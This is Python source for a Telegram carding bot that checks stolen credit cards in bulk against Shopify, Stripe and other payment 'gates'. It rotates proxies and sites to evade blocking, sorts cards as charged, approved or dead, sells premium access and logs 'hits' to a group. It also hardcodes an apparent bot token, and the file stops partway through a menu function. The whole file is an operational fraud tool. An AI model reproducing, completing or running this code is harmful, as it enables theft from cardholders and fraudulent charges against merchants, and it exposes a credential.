import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
import string
import logging
from datetime import datetime
from typing import List, Tuple

# Completely silence terminal logging from libraries (httpx, telegram, etc.)
logging.basicConfig(level=logging.CRITICAL, handlers=[logging.NullHandler()])
for _name in ("httpx", "httpcore", "telegram", "telegram.ext", "urllib3", "aiohttp", "vxo", "shopify_auto", "webshare", "bot"):
    _lg = logging.getLogger(_name)
    _lg.setLevel(logging.CRITICAL)
    _lg.propagate = False
    _lg.handlers.clear()

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, MessageEntity, Message
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from telegram.error import BadRequest
from telegram.request import HTTPXRequest

# Fix Python 3.13 + PTB 21.1 weakref incompatibility:
# Application.__slots__ doesn't include __weakref__, so weakref.ref() fails.
# Workaround: patch JobQueue.set_application to store a callable wrapper
# instead of a weakref. Safe because Application always outlives the queue.
try:
    from telegram.ext import _jobqueue as _jq
    _orig_set_app = _jq.JobQueue.set_application
    def _patched_set_application(self, application):
        try:
            _orig_set_app(self, application)
        except TypeError:
            self._application = lambda: application
    _jq.JobQueue.set_application = _patched_set_application
except Exception:
    pass


# Monkey patch reply_text and reply_photo on telegram.Message to automatically fall back
# to sending the message directly without reply/quote if the target message has been deleted.
_orig_reply_text = Message.reply_text
_orig_reply_photo = Message.reply_photo

async def _safe_reply_text(self, text: str, *args, **kwargs):
    try:
        return await _orig_reply_text(self, text, *args, **kwargs)
    except BadRequest as e:
        if "Message to be replied not found" in str(e):
            kwargs.pop('reply_to_message_id', None)
            kwargs.pop('reply_parameters', None)
            kwargs['do_quote'] = False
            try:
                return await _orig_reply_text(self, text, *args, **kwargs)
            except Exception:
                pass
        raise e

async def _safe_reply_photo(self, photo, *args, **kwargs):
    try:
        return await _orig_reply_photo(self, photo, *args, **kwargs)
    except BadRequest as e:
        if "Message to be replied not found" in str(e):
            kwargs.pop('reply_to_message_id', None)
            kwargs.pop('reply_parameters', None)
            kwargs['do_quote'] = False
            try:
                return await _orig_reply_photo(self, photo, *args, **kwargs)
            except Exception:
                pass
        raise e

Message.reply_text = _safe_reply_text
Message.reply_photo = _safe_reply_photo

# Import your gate functions (ensure gates.py is in same folder)
from gates import (
    shopify_auto_check, vbv_check,
    check_authnet_charge, check_bluepay_charge,
    analyze_url,
    stripe_auth1_check, stripe_auth2_check, stripe_auth3_check,
)
from gates.response_classifier import classify_gate_response, status_header, sanitize_response
from gates.whop_charge import whop_check
from gates.jio_recharge_gate import jio_recharge_check

# ==================== PREMIUM EMOJI IDs ====================
PREMIUM_EMOJI_IDS = {
    # Success/Check/Sparkles
    "✅": "6087133294648890399",  # Animated Checkmark
    "✨": "5350444080084033572",  # Animated Sparkles
    
    # Declined/Error/Warning/Forbidden
    "❌": "6114014038960638990",  # Animated Red Cross
    "⚠️": "4976595579585954670",  # Animated Warning Triangle
    "🚫": "4956337889593000947",  # Animated Cross/Forbidden Sign
    
    # Charged/Hot
    "🔥": "5212920133504212456",  # Animated Fire
    
    # Gate/Energy/Spark/Security/Tools
    "⚡": "5370891405768022450",  # Animated Lightning Bolt
    "🛡️": "6203944611119897090",  # Animated Shield/Security
    "🔌": "5042101437237036298",  # Animated Connection Link/Plug
    "🛠️": "6323218545874306931",  # Animated Tools
    "⚙️": "5816436147525522455",  # Animated Gear
    "💬": "5445140257760639304",  # Animated Chat/Bubble
    "ℹ️": "5258503720928288433",  # Animated Info
    
    # Premium/Luxury/Wealth/Card
    "💎": "4956719506027185156",  # Animated Diamond
    "👑": "5433758796289685818",  # Animated Crown
    "💳": "5447453226498552490",  # Animated Credit Card
    "💰": "6190336264940559752",  # Animated Money Bag
    "💸": "5262509177363787445",  # Animated Flying Money
    "🛒": "5447319442562251569",  # Animated Shopping Cart
    
    # Killer/Cool/Folder
    "💀": "5451838839079322745",  # Animated Skull
    "🎭": "5971837723676249096",  # Animated Theater Masks
    "👤": "5258011929993026890",  # Animated Profile User
    "🦇": "6325842397230010375",  # Animated Bat/Mass check
    
    "📁": "5787230777934613861",  # Animated Folder
    "🏦": "5332455502917949981",  # Animated Bank
    "🌍": "5303440357428586778",  # Animated Globe
    "🌏": "5303440357428586778",  # Animated Globe Asia
    "🌐": "5303440357428586778",  # Animated Proxy Globe
    "🏳️": "5397730656400714154",  # Animated Flag
    "🆔": "6066395745139824604",  # Animated ID card
    "📝": "6066395745139824604",  # Animated Document
    
    "🔍": "4958587679361991667",  # Animated Search
    
    # Control/Time/Stop
    "🛑": "5260249440450520061",  # Animated Stop sign
    "🤚": "5260249440450520061",  # Animated Hand / Stop
    "⏸️": "6001440193058444284",  # Animated Pause
    "⏳": "5258419835922030550",  # Animated Hourglass
    "⌛": "5258419835922030550",  # Animated Hourglass
    "🕒": "5258419835922030550",  # Animated Clock
    "🕔": "5258419835922030550",  # Animated Clock 5
    "⏱️": "5258419835922030550",  # Animated Stopwatch
    "🔙": "6206505206197261313",  # Animated Back button
    "🔒": "5258476306152038031",  # Animated Lock
    "🔐": "5258476306152038031",  # Animated Lock with Key
    
    # Play/Resume
    "▶️": "5208607440878197365",  # Animated Play
    "📈":"5258391025281408576",
    # Additional UI emojis for the new design
    "🛍️": "5971944878815317190",  # Animated Shopping Bag
    "🗑️": "5971837723676249096",  # Animated Trash/BIN Info
    "😈": "5971837723676249096",  # Animated Devil/Level
}


def premium_emoji_tag(emoji_char: str) -> str:
    if emoji_char in PREMIUM_EMOJI_IDS:
        return f"{{{{custom:{PREMIUM_EMOJI_IDS[emoji_char]}:{emoji_char}}}}}"
    return emoji_char

def build_entities_with_custom_emojis(text: str) -> Tuple[str, List[MessageEntity]]:
    import re as _re
    
    pattern = _re.compile(
        r'\{\{custom:(\d+):(.*?)\}\}'
        r'|\{\{spoiler:(.*?)\}\}'
        r'|\{\{pre:(.*?)\}\}'
        r'|\{\{code:(.*?)\}\}'
        r'|\{\{link\|(.*?)\|(.*?)\}\}'
        r'|\*\*(.*?)\*\*',
        flags=_re.DOTALL
    )
    
    result_parts = []
    entities = []
    
    current_utf16_len = 0
    last_idx = 0
    
    def get_utf16_len(s: str) -> int:
        return len(s.encode('utf-16-le')) // 2

    for m in pattern.finditer(text):
        before = text[last_idx:m.start()]
        if before:
            result_parts.append(before)
            current_utf16_len += get_utf16_len(before)
        
        g1, g2, g3, g4, g5, g6, g7, g8 = m.groups()
        if g1 is not None:
            val = g2
            val_utf16_len = get_utf16_len(val)
            if val_utf16_len > 0:
                entities.append(MessageEntity(
                    type=MessageEntity.CUSTOM_EMOJI,
                    offset=current_utf16_len,
                    length=val_utf16_len,
                    custom_emoji_id=str(g1)
                ))
        elif g3 is not None:
            val = g3
            val_utf16_len = get_utf16_len(val)
            if val_utf16_len > 0:
                entities.append(MessageEntity(
                    type=MessageEntity.SPOILER,
                    offset=current_utf16_len,
                    length=val_utf16_len
                ))
        elif g4 is not None:
            val = g4
            val_utf16_len = get_utf16_len(val)
            if val_utf16_len > 0:
                entities.append(MessageEntity(
                    type=MessageEntity.PRE,
                    offset=current_utf16_len,
                    length=val_utf16_len,
                    language=''
                ))
        elif g5 is not None:
            val = g5
            val_utf16_len = get_utf16_len(val)
            if val_utf16_len > 0:
                entities.append(MessageEntity(
                    type=MessageEntity.CODE,
                    offset=current_utf16_len,
                    length=val_utf16_len
                ))
        elif g6 is not None:
            val = g7
            val_utf16_len = get_utf16_len(val)
            if val_utf16_len > 0:
                entities.append(MessageEntity(
                    type=MessageEntity.TEXT_LINK,
                    offset=current_utf16_len,
                    length=val_utf16_len,
                    url=g6
                ))
        elif g8 is not None:
            val = g8
            val_utf16_len = get_utf16_len(val)
            if val_utf16_len > 0:
                entities.append(MessageEntity(
                    type=MessageEntity.BOLD,
                    offset=current_utf16_len,
                    length=val_utf16_len
                ))
        else:
            val = ''
            val_utf16_len = 0
            
        if val:
            result_parts.append(val)
            current_utf16_len += val_utf16_len
            
        last_idx = m.end()
        
    remaining = text[last_idx:]
    if remaining:
        result_parts.append(remaining)
        
    final_text = ''.join(result_parts)
    entities.sort(key=lambda e: e.offset)
    return final_text, entities

# ==================== BOT CONFIGURATION ====================
BOT_TOKEN = '8774723543:AAFghaX02hsvGEt9JEuxqtcKOeTCzVVwRhM'
OWNER_ID = 7465463947
HIT_LOG_GROUP_ID = -1002553955578  # Will be overridden from hitlog_config.json if exists
HIT_LOG_CONFIG_FILE = 'hitlog_config.json'

def _load_hit_log_group():
    global HIT_LOG_GROUP_ID
    try:
        if os.path.exists(HIT_LOG_CONFIG_FILE):
            with open(HIT_LOG_CONFIG_FILE, 'r', encoding='utf-8', errors='ignore') as f:
                data = json.load(f)
                HIT_LOG_GROUP_ID = data.get('group_id')
    except:
        pass

def _save_hit_log_group(group_id):
    global HIT_LOG_GROUP_ID
    HIT_LOG_GROUP_ID = group_id
    try:
        with open(HIT_LOG_CONFIG_FILE, 'w', encoding='utf-8') as f:
            json.dump({'group_id': group_id}, f)
    except:
        pass

_load_hit_log_group()  # Load on startup
TELEGRAM_PROXY_URL = None # e.g., 'http://127.0.0.1:10809' or 'socks5://127.0.0.1:10808' if Telegram is blocked in your country

SITES_FILE = 'sites.txt'
USER_PROXIES_FILE = 'user_proxies.json'
KEYS_FILE = 'keys.json'
PREMIUM_DATA_FILE = 'premium_data.json'
BOT_USERS_FILE = 'bot_users.json'
PHOTO_CACHE_FILE = 'photo_cache.json'
MAINTENANCE_FILE = 'maintenance_data.json'
MAX_USER_PROXIES = 999999  # No limit — all live proxies get stored
MAX_CC_MASS = 5000

active_sessions = {}
user_processing = {}

def get_cached_photo_id():
    try:
        if os.path.exists(PHOTO_CACHE_FILE):
            with open(PHOTO_CACHE_FILE, 'r', encoding='utf-8', errors='ignore') as f:
                return json.load(f).get('welcome_photo')
    except Exception:
        pass
    return None

def set_cached_photo_id(file_id):
    try:
        with open(PHOTO_CACHE_FILE, 'w', encoding='utf-8') as f:
            json.dump({'welcome_photo': file_id}, f)
    except Exception:
        pass


def get_file_lines(filepath):
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception:
        return []

def load_sites():
    return get_file_lines(SITES_FILE)

def remove_site(site_url):
    """Remove a bad site from sites.txt automatically."""
    try:
        sites = load_sites()
        site_clean = site_url.strip().rstrip('/')
        updated = [s for s in sites if s.strip().rstrip('/') != site_clean]
        if len(updated) < len(sites):
            with open(SITES_FILE, 'w', encoding='utf-8') as f:
                f.write('\n'.join(updated) + '\n')
    except Exception:
        pass

def _load_json(filepath):
    try:
        if os.path.exists(filepath):
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                return json.load(f)
    except Exception:
        pass
    return {}

def _save_json(filepath, data):
    with open(filepath, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def load_user_proxies(user_id):
    data = _load_json(USER_PROXIES_FILE)
    user_proxies = data.get(str(user_id), [])
    # Fallback: if user has no proxies, auto-use owner's proxies (works for ALL users)
    if not user_proxies and int(user_id) != OWNER_ID:
        user_proxies = data.get(str(OWNER_ID), [])
    return user_proxies

async def auto_fetch_proxies(user_id, count=10):
    """Auto-fetch free proxies from webshare.io when user has none.
    Saves fetched proxies to user_proxies.json so they persist.
    Returns list of proxy strings (ip:port:user:pass format)."""
    try:
        from webshare import get_free_proxies
        proxies = await get_free_proxies(count, user_id=int(user_id))
        if proxies:
            # Convert to format expected by bot (ip:port:user:pass)
            formatted = []
            for p in proxies:
                p = p.strip()
                if p:
                    formatted.append(p)
            if formatted:
                save_user_proxies(user_id, formatted)
                return formatted
    except Exception as e:
        import logging
        logging.getLogger('bot').warning(f"[AUTO-PROXY] webshare fetch failed: {e}")
    return []

async def ensure_proxies(user_id):
    """Load user proxies, auto-fetching from webshare if none exist.
    Returns (proxies_list, was_auto_fetched_bool)."""
    proxies = load_user_proxies(user_id)
    if proxies:
        return proxies, False
    # No proxies — auto-fetch from webshare
    proxies = await auto_fetch_proxies(user_id)
    return proxies, bool(proxies)

def save_user_proxies(user_id, proxies):
    data = _load_json(USER_PROXIES_FILE)
    data[str(user_id)] = proxies  # No limit — store ALL proxies
    _save_json(USER_PROXIES_FILE, data)

def is_premium(user_id):
    if int(user_id) == OWNER_ID:
        return True
    data = _load_json(PREMIUM_DATA_FILE)
    info = data.get(str(user_id))
    if not info:
        return False
    expiry = info.get('expiry', 0)
    if time.time() > expiry:
        del data[str(user_id)]
        _save_json(PREMIUM_DATA_FILE, data)
        return False
    return True

def track_user(user_id, username=None):
    uid = str(user_id)
    data = _load_json(BOT_USERS_FILE)
    updated = False
    if uid not in data:
        data[uid] = {'joined': int(time.time())}
        updated = True
    if username:
        username_clean = str(username).lower().lstrip('@')
        if data[uid].get('username') != username_clean:
            data[uid]['username'] = username_clean
            updated = True
    if updated:
        _save_json(BOT_USERS_FILE, data)

def find_user_id(target: str) -> int:
    target = target.strip()
    if not target:
        return None
    if target.isdigit():
        return int(target)
    username_clean = target.lower().lstrip('@')
    users_data = _load_json(BOT_USERS_FILE)
    for uid, info in users_data.items():
        if info.get('username') == username_clean:
            return int(uid)
    return None

def get_all_user_ids():
    data = _load_json(BOT_USERS_FILE)
    return [int(uid) for uid in data.keys()]

def is_user_busy(user_id):
    return user_processing.get(user_id, False)

def bold_sans(text):
    result = []
    for c in text:
        if 'A' <= c <= 'Z':
            result.append(chr(0x1D5D4 + ord(c) - ord('A')))
        elif 'a' <= c <= 'z':
            result.append(chr(0x1D5EE + ord(c) - ord('a')))
        elif '0' <= c <= '9':
            result.append(chr(0x1D7EC + ord(c) - ord('0')))
        else:
            result.append(c)
    return ''.join(result)

def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

async def download_telegram_file(bot, file_id, path, max_retries=3):
    import telegram.error
    import asyncio
    
    last_error = None
    for attempt in range(max_retries):
        try:
            file = await bot.get_file(file_id)
            await file.download_to_drive(path)
            return True
        except (telegram.error.TimedOut, telegram.error.NetworkError) as e:
            last_error = e
            if attempt < max_retries - 1:
                await asyncio.sleep(1.5 * (attempt + 1))
                continue
        except Exception as e:
            last_error = e
            break
            
    if last_error is not None:
        raise last_error
    raise RuntimeError("Failed to download telegram file")

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return 'BIN Info Not Found', '-', '-', '-', '-', ''
                data = await res.json()
                brand = data.get('brand', '-')
                bin_type = data.get('type', '-')
                level = data.get('level', '-')
                bank = data.get('bank', '-')
                country = data.get('country_name', '-')
                flag = data.get('country_flag', '')
                return brand, bin_type, level, bank, country, flag
    except Exception:
        return '-', '-', '-', '-', '-', ''

# ONLY remove sites that genuinely have NO products — everything else just skip
_SITE_REMOVE_INDICATORS = [
    'product not found', 'product id is empty', 'handle is empty',
    'no valid products', 'no_valid_products', 'no products', 'no_products',
]

# Site-level errors — skip to different site but do NOT remove from sites.txt
_SITE_SKIP_INDICATORS = [
    'r4 token empty', 'r3 token empty', 'r2 id empty',
    'out of stock', 'sold out', 'merchandise_out_of_stock',
    'this product is currently unavailable', 'item is out of stock',
    'some items in your cart are no longer available', 'insufficient_inventory',
    'inventory_unavailable', 'stock_problems', 'stock-problems',
    'payment method is not shopify', 'not shopify', 'site not supported', 'bad site',
    'site requires login', 'hcaptcha', 'captcha_required', 'captcha',
    'payments_invalid_gateway_for_development_store',
    'payments_proposed_gateway_unavailable',
    'buyer_identity_currency_not_supported_by_shop',
    'payments_credit_card_brand_not_supported',
    'invalid_purchase_type',
]

# TEMPORARY errors — retry with different site but do NOT remove the site
_TEMP_ERROR_INDICATORS = [
    'timeout', 'timed out', 'connection error', 'connection failed',
    'proxy error', 'connection_proxy_error', 'connect tunnel failed',
    'empty reply from server', 'gateway timeout', 'bad gateway',
    'internal server error', 'service unavailable', 'server error',
    '504', 'http_error_504', 'ssl routines', 'tlsv1 alert',
    'openssl ssl_connect', 'could not resolve', 'curl error',
    'cloudflare', 'access denied', 'client error',
    'change proxy or site', 'session token not found',
    'failed to get token', 'failed to get session token',
    'failed to get shipping rates', 'failed to get checkout',
    'token empty', 'token not found', 'card token is empty',
    'session is null', 'negotiate returned null', 'result is null',
    'seller proposal is null', 'proposal failed',
    'step 1 failed', 'invalid json', 'invalid_response',
    'delivery ammount empty', 'del ammount empty',
    'delivery rates are empty', 'shipping info is empty',
    'tax ammount empty', 'delivery_company_required',
    'delivery_no_delivery_strategy_available',
    'delivery_delivery_line_detail_changed',
    'delivery_address2_required', 'delivery_zone_not_found',
    'delivery_invalid_postal_code_for_country',
    'delivery_phone_number_does_not_match_expected_pattern',
    'payments_phone_number_does_not_match_expected_pattern',
    'payments_invalid_postal_code_for_country',
    'payments_zone_not_found', 'delivery_strategy_changed',
    'delivery_changed', 'shipping_changed',
    'validation_custom', 'required_artifacts',
    'artifact_dissatisfaction', 'required_artifacts_unavailable',
    'tax/price changed', 'tax_new_tax_must_be_accepted',
    'amount_too_small', 'cart addition failed',
    'graphql submission failed', 'receipt id is empty', 'receipt_empty',
    'payment method identifier is empty', 'processing_error',
    'buyer_identity_presentment_currency_does_not_match',
    'waiting_pending_terms', 'payments_payment_flexibility_terms_id_mismatch',
    'throttled',
]

async def shopify_check_card(card, sites, proxies, max_retries=5):
    import logging as _bot_logging
    _bot_log = _bot_logging.getLogger("shopify_auto")

    if not proxies:
        return {
            'status': 'Dead',
            'message': 'No proxies available - proxy is REQUIRED',
            'card': card,
            'gateway': 'Shopify',
            'price': '-',
            'raw': '-'
        }
    if not sites:
        return {
            'status': 'Dead',
            'message': 'No sites available',
            'card': card,
            'gateway': 'Shopify',
            'price': '-',
            'raw': '-'
        }

    # ═══ ALWAYS DIFFERENT SITE + PROXY PER CARD ═══
    shuffled_sites = list(sites)
    random.shuffle(shuffled_sites)
    shuffled_proxies = list(proxies)
    random.shuffle(shuffled_proxies)
    proxy_index = random.randint(0, len(shuffled_proxies) - 1)

    # Soft errors = site config issues, NOT card responses → these get rechecked with DIFFERENT site
    _SOFT_ERROR_KEYWORDS = [
        'try_another_site', 'throttled', 'timeout', 'timed out', 'TIMEOUT',
        'connection error', 'connection failed', 'proxy error',
        'empty reply', 'gateway timeout', 'bad gateway', 'server error',
        'service unavailable', 'access denied', 'cloudflare',
        'curl error', 'ssl routines', 'could not resolve',
        'token empty', 'token not found', 'session token not found',
        'session is null', 'negotiate returned null', 'result is null',
        'failed to get session token', 'seller proposal is null',
        'cart addition failed', 'product not found', 'out of stock',
        'no valid products', 'no_products', 'no products', 'delivery_no_delivery', 'receipt_empty',
        'graphql submission failed', 'amount_too_small',
        'waiting_pending_terms', 'tax_new_tax_must_be_accepted',
        'captcha_required', 'captcha', 'session_blocked', 'rate_limited',
        'tokenization failed', 'access_denied',
        # Site config rejections — NOT card responses
        'phone_number_does_not_match', 'does_not_match_expected_pattern',
        'delivery_delivery_line_detail_changed', 'delivery_strategy_changed',
        'delivery_changed', 'shipping_changed', 'delivery_zone_not_found',
        'payments_zone_not_found', 'invalid_postal_code_for_country',
        'merchandise_expected_price_mismatch',
        'payments_payment_flexibility_terms_id_mismatch',
        'payments_unacceptable_payment_amount', 'validation_custom',
        'buyer_identity_currency_not_supported',
        'buyer_identity_presentment_currency_does_not_match',
        # Mapped Shopify error codes that are site issues, not card issues
        'terms_required', 'site_tax_mismatch', 'site_tax_renegotiate',
        'site_currency_mismatch', 'site_payment_amount_mismatch',
        'site_config_error', 'site_min_order', 'site_brand_blocked',
        'site_delivery_error', 'payment_method_invalid',
        'processing_error', 'captcha_required',
        # Step failures = site/proxy issue, not card issue
        'step 1 failed', 'step 2 failed', 'step 3 failed', 'step 4 failed',
        'step 5 failed', 'step 8 failed', 'step 10 failed',
        'missing stableid', 'missing buildid',
        'cart permalink returned', 'could not extract delivery handle',
        'decision_rule_block',
    ]

    def _is_soft_error(msg_text):
        msg_lower = str(msg_text).lower()
        return any(k in msg_lower for k in _SOFT_ERROR_KEYWORDS)

    _bot_log.info(f"[CHECK] card=****{card.split('|')[0][-4:]} sites={len(sites)} proxies={len(proxies)}")

    # ═══ ATTEMPT 1: First request — result is ALWAYS printed ═══
    site = shuffled_sites[0]
    proxy = shuffled_proxies[proxy_index % len(shuffled_proxies)]
    proxy_index += 1

    _bot_log.info(f"[CHECK] Attempt 1 site={site} proxy={proxy[:30]}...")

    try:
        status, response_msg, price, raw_graphql, _receipt_url = await shopify_auto_check(card, site, proxy)
    except Exception as e:
        _bot_log.error(f"[CHECK] Exception on attempt 1: {type(e).__name__}: {e}")
        status, response_msg, price, raw_graphql, _receipt_url = "ERROR", str(e), "-", "-", ""

    # Fix floating point price display (e.g. 15.700000000000001 → 15.70)
    try:
        price_num = float(str(price).replace('$','').replace(',',''))
        fixed_price = f'${price_num:.2f}'
    except (ValueError, TypeError):
        fixed_price = f'${price}' if price and not str(price).startswith('$') and price != '-' else (price or '-')

    # ═══ IF SOFT ERROR → UP TO 3 rechecks with different site + proxy ═══
    # Check response message regardless of status — site errors can come back as 'Declined' too
    _max_soft_retries = min(3, len(shuffled_sites) - 1)
    if _is_soft_error(response_msg) and _max_soft_retries > 0:
        for _retry_idx in range(1, _max_soft_retries + 1):
            _bot_log.info(f"[CHECK] Soft error '{response_msg}' — retry {_retry_idx}/{_max_soft_retries} with different site + proxy")
            await asyncio.sleep(0.3)

            site2 = shuffled_sites[_retry_idx]
            proxy2 = shuffled_proxies[proxy_index % len(shuffled_proxies)]
            proxy_index += 1

            _bot_log.info(f"[CHECK] Retry {_retry_idx} site={site2} proxy={proxy2[:30]}...")

            try:
                status, response_msg, price, raw_graphql, _receipt_url = await shopify_auto_check(card, site2, proxy2)
            except Exception as e:
                _bot_log.error(f"[CHECK] Exception on retry {_retry_idx}: {type(e).__name__}: {e}")
                status, response_msg, price, raw_graphql, _receipt_url = "ERROR", str(e), "-", "-", ""

            # Fix price formatting
            try:
                price_num = float(str(price).replace('$','').replace(',',''))
                fixed_price = f'${price_num:.2f}'
            except (ValueError, TypeError):
                fixed_price = f'${price}' if price and not str(price).startswith('$') and price != '-' else (price or '-')
            site = site2  # update site for result

            # If we got a non-soft response (real card decline/approve), break out
            if not _is_soft_error(response_msg):
                break

    # ═══ RETURN WHATEVER WE GOT — no more retries ═══
    _bot_log.info(f"[CHECK] FINAL: status={status} msg={response_msg}")

    _raw_trunc = str(raw_graphql)[:200] if raw_graphql else '-'
    _base = {'card': card, 'site': site, 'gateway': 'Shopify', 'price': fixed_price, 'raw': _raw_trunc, 'receipt_url': _receipt_url or ''}
    if status in ('CHARGED', 'Charged'):
        return {**_base, 'status': 'Charged', 'message': response_msg}
    elif status in ('LIVE', 'Approved'):
        return {**_base, 'status': 'Approved', 'message': response_msg}
    elif status == '3DS':
        return {**_base, 'status': '3DS', 'message': response_msg}
    elif status == 'Pending':
        return {**_base, 'status': 'Pending', 'message': response_msg}
    elif status in ('Dead', 'Declined'):
        return {**_base, 'status': 'Dead', 'message': response_msg}
    else:
        return {**_base, 'status': 'Error', 'message': response_msg or 'Gate Error'}
# ==================== MENUS WITH COLORFUL BUTTONS ====================
def get_main_menu():
    text = (
        f"{premium_emoji_tag('✨')} **{bold_sans('WELCOME TO PRAKASH x CHECKER')}** {premium_emoji_tag('✨')}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{premium_emoji_tag('🔥')} **{bold_sans('WHERE LEGENDS BURN THROUGH FIRE')}** {premium_emoji_tag('🔥')}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{premium_emoji_tag('💀')} **{bold_sans('Version ~ v2')}**\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{premium_emoji_tag('👑')} **{bold_sans('Dev ~')}** {{{{link|tg://user?id=7622071677|{bold_sans('『 PRAKASH 』')}}}}} {premium_emoji_tag('👑')}"
    )
    buttons = [
        [
            InlineKeyboardButton(text="Gate", callback_data="menu_gate", api_kwargs={"style": "primary", "icon_custom_emoji_id": "5370891405768022450"}),
            InlineKeyboardButton(text="Mass", callback_data="menu_mass", api_kwargs={"style": "primary", "icon_custom_emoji_id": "6325842397230010375"})
        ],
        [
            InlineKeyboardButton(text="KILLER", callback_data="menu_hitter", api_kwargs={"style": "danger", "icon_custom_emoji_id": "5451838839079322745"}),
            InlineKeyboardButton(text="Profile", callback_data="menu_profile", api_kwargs={"style": "primary", "icon_custom_emoji_id": "5258011929993026890"})
        ],
        [
            InlineKeyboardButton(text="Pricing", callback_data="menu_pricing", api_kwargs={"style": "primary", "icon_custom_emoji_id": "4956719506027185156"}),
            InlineKeyboardButton(text="Tools", callback_data="menu_tools", api_kwargs={"style": "primary", "icon_custom_emoji_id": "6323218545874306931"})
        ],
        [
            InlineKeyboardButton(text="Owner", url="tg://user?id=7622071677", api_kwargs={"style": "danger", "icon_custom_emoji_id": "5769547529993588669"})
        ]
    ]
    return text, InlineKeyboardMarkup(buttons)

def get_gate_menu():
    text = (
        f"{premium_emoji_tag('⚡')} **{bold_sans('PAYMENT GATES')}** {premium_emoji_tag('⚡')}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{premium_emoji_tag('🔐')} **{bold_sans('Auth Gates')}** ➔ {bold_sans('Card verification (no charge)')}\n"
        f"{premium_emoji_tag('💰')} **{bold_sans('Charge Gates')}** ➔ {bold_sans('Live payment processing')}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{premium_emoji_tag('ℹ️')} *{bold_sans('Select a category below.')}*"
    )
    buttons = [
        [
            InlineKeyboardButton(text="Auth Gates", callback_data="menu_gate_auth", api_kwargs={"style": "primary", "icon_custom_emoji_id": "6147666194351529665"}),
            InlineKeyboardButton(text="Charge Gates", callback_data="menu_gate_charge", api_kwargs={"style": "danger", "icon_custom_emoji_id": "6089104607328342288"})
        ],
        [InlineKeyboardButton(text="Back to Menu", callback_data="menu_main", api_kwargs={"style": "primary", "icon_custom_emoji_id": "6206505206197261313"})]
    ]
    return text, InlineKeyboardMarkup(buttons)

def get_gate_auth_menu():
    text = (
        f"{premium_emoji_tag('🔐')} **{bold_sans('AUTH GATES')}** {premium_emoji_tag('🔐')}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{premium_emoji_tag('💳')} **{bold_sans('Stripe Auth 1')}** ➔ `/st1 card|mm|yy|cvv`\n"
        f"{premium_emoji_tag('💳')} **{bold_sans('Stripe Auth 2')}** ➔ `/st2 card|mm|yy|cvv`\n"
        f"{premium_emoji_tag('💳')} **{bold_sans('Stripe Auth 3')}** ➔ `/st3 card|mm|yy|cvv`\n"
        f"{premium_emoji_tag('🛡️')} **{bold_sans('VBV / 3DS2')}** ➔ `/vbv card|mm|yy|cvv`\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{premium_emoji_tag('ℹ️')} *{bold_sans('Card verification — no charges made.')}*"
    )
    buttons = [
        [InlineKeyboardButton(text="Back to Gates", callback_data="menu_gate", api_kwargs={"style": "primary", "icon_custom_emoji_id": "6206505206197261313"})],
        [InlineKeyboardButton(text="Main Menu", callback_data="menu_main", api_kwargs={"style": "primary", "icon_custom_emoji_id": "6206505206197261313"})]
    ]
    return text, InlineKeyboardMarkup(buttons)

def get_gate_charge_menu():
    text = (
        f"{premium_emoji_tag('💰')} **{bold_sans('CHARGE GATES')}** {premium_emoji_tag('💰')}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{premium_emoji_tag('🛒')} **{bold_sans('Shopify Auto')}** ➔ `/sh card|mm|yy|cvv`\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
    )
    buttons = [
        [InlineKeyboardButton(text="Back to Gates", callback_data="menu_gate", api_kwargs={"style": "primary", "icon_custom_emoji_id": "6206505206197261313"})],
        [InlineKeyboardButton(text="Main Menu", callback_data="menu_main", api_kwargs={"style": "primary", "icon_custom_emoji_id": "6206505206197261313"})]
    ]
    return text, InlineKeyboardMarkup(buttons)

def get_mass_menu():
    text = (
        f"{premium_emoji_tag('🦇')} **{bold_sans('MASS CHECK GATES')}** {premium_emoji_tag('🦇')}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{premium_emoji_tag('🛒')} **{bold_sans('Shopify Mass (Text)')}** ➔ `/msh`\n"
        f"{premium_emoji_tag('📁')} **{bold_sans('Shopify Mass (.txt)')}** ➔ `/mshtxt`\n"
        f"{premium_emoji_tag('🔐')} **{bold_sans('Stripe Auth Mass (Text)')}** ➔ `/mst`\n"
        f"{premium_emoji_tag('📁')} **{bold_sans('Stripe Auth Mass (.txt)')}** ➔ `/msttxt`\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{premium_emoji_tag('👑')} *{bold_sans('Premium/Paid users only.')}*"
    )
    buttons = [[InlineKeyboardButton(text="Back to Menu", callback_data="menu_main", api_kwargs={"style": "primary", "icon_custom_emoji_id": "6206505206197261313"})]]
    return text, InlineKeyboardMarkup(buttons)

def get_hitter_menu():
    text = (
        f"{premium_emoji_tag('💀')} **{bold_sans('CARD KILLER & HITTERS')}** {premium_emoji_tag('💀')}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{premium_emoji_tag('💳')} **{bold_sans('Kill Check')}** ➔ `/kd card|mm|yy|cvv`\n"
